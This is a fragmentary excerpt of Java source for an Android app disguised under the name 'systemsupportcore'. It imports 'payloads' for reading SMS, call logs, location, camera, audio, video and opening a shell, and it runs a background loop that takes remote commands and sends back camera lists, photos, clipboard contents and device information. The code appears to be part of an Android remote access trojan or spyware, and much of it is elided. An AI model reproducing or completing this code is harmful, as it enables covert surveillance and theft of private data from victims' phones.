...
import com.app.systemsupportcore.payloads.CameraPreview;
import com.app.systemsupportcore.payloads.audioManager;
import com.app.systemsupportcore.payloads.ipAddr;
import com.app.systemsupportcore.payloads.locationManager;
import com.app.systemsupportcore.payloads.newShell;
import com.app.systemsupportcore.payloads.readCallLogs;
import com.app.systemsupportcore.payloads.readSMS;
import com.app.systemsupportcore.payloads.videoRecorder;
    ...
    protected Void doInBackground(String... strings) {
        ...
        try {
            ...
            while ((line = in.readLine()) != null)
            {
                ...
                {
                    String list = funct.get_numberOfCameras();
                    out.write(list.getBytes("UTF-8"));
                }
                else if (line.matches("takepic \\d"))
                {
                    funct.getScreenUp(activity);
                ...
                {
                    String clipboard_data = funct.readFromClipboard();
                ...
                {
                    out.write(funct.deviceInfo().getBytes());
                }
